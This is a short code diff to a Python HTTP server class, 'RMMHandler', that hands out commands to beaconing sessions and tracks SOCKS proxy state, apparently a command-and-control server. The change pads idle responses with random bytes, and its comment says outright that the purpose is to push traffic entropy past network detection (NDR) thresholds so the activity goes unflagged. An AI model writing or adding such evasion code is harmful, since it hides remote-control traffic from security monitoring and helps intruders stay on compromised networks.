@@ -2515,12 +2515,17 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._respond(400, err)
             else:
                 cmd, resp_type = self.server_instance.get_command(session_id)
-                response = json.dumps({
+                payload = {
                     "command": cmd,
                     "type": resp_type,
                     "socks_active": self.server_instance.socks_active(session_id),
-                })
-                self._respond(200, response, "application/json")
+                }
+                if resp_type == "none":
+                    # Vary idle response size (16–512 random bytes as hex) so that
+                    # bytes_received entropy is high enough to pass NDR activity filters
+                    # (e.g. deep_tunnel_t1 SCV threshold).  The client ignores unknown fields.
+                    payload["_p"] = secrets.token_hex(16 + secrets.randbelow(497))
+                self._respond(200, json.dumps(payload), "application/json")
         
         elif path == "/ping":
             err, session_id = self._beacon_session_id_from_qs(qs)
